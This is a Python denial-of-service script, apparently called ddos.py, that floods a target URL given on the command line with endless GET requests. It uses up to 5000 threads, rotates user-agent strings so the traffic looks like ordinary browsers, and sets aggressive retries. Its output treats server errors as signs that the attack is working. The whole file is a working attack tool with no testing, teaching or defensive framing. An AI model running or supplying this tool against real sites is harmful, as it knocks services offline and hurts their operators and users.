

import threading
import requests
import sys
import time
from random import uniform
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from fake_useragent import UserAgent

MAX_RETRIES = 50
BACKOFF_FACTOR = 0.5
REQUEST_TIMEOUT = 10
DELAY_RANGE = (0.1, 0.3)

def create_session():
    session = requests.Session()
    retries = Retry(
        total=MAX_RETRIES,
        backoff_factor=BACKOFF_FACTOR,
        status_forcelist=[500, 502, 503, 504]
    )
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

def attack(url, thread_num):
    session = create_session()
    request_count = 0
    
    while True:
        try:
            time.sleep(uniform(*DELAY_RANGE))
            
            response = session.get(
                url, 
                timeout=REQUEST_TIMEOUT,
                headers={'User-Agent': get_random_user_agent()}
            )
            status = response.status_code
            request_count += 1
            
            if status == 200:
                print(f"\033[92mThread {thread_num} - Req {request_count}: OK (200)\033[0m")
            elif status == 503:
                print(f"\033[91mThread {thread_num} - Req {request_count}: GATEWAY TIMEOUT (503)\033[0m")
            elif 500 <= status < 600:
                print(f"\033[93mThread {thread_num} - Req {request_count}: Server Error ({status})\033[0m")
            else:
                print(f"Thread {thread_num} - Req {request_count}: Status {status}")
                
        except requests.exceptions.ConnectionError:
            print(f"\033[91mThread {thread_num} - Connection Error (Retrying...)\033[0m")
            time.sleep(2)
        except requests.exceptions.Timeout:
            print(f"\033[91mThread {thread_num} - Request Timeout (Retrying...)\033[0m")
            time.sleep(1)
        except Exception as e:
            print(f"\033[91mThread {thread_num} - Critical Error: {str(e)} (Restarting Thread)\033[0m")
            time.sleep(5)
            session = create_session()

def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    ]
    return agents[int(uniform(0, len(agents)))]

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 ddos.py <target_url> <threads>")
        sys.exit(1)

    url = sys.argv[1]
    threads = int(sys.argv[2])

    print(f"\n\033[94m[!] Starting attack on {url} with {threads} threads\033[0m")
    print("\033[94m[!] Press CTRL+C to stop the attack\033[0m\n")
    MAX_THREADS = 5000
    if threads > MAX_THREADS:
        print(f"\033[93m[!] Warning: Thread count capped at {MAX_THREADS}\033[0m")
        threads = MAX_THREADS

    thread_pool = []
    for i in range(threads):
        try:
            thread = threading.Thread(target=attack, args=(url, i+1))
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
        except Exception as e:
            print(f"\033[91m[!] Failed to start thread {i+1}: {str(e)}\033[0m")

    try:
        while True:
            alive_threads = sum(1 for t in thread_pool if t.is_alive())
            print(f"\033[94m[!] Active threads: {alive_threads}/{threads}\033[0m")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopping attack...\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
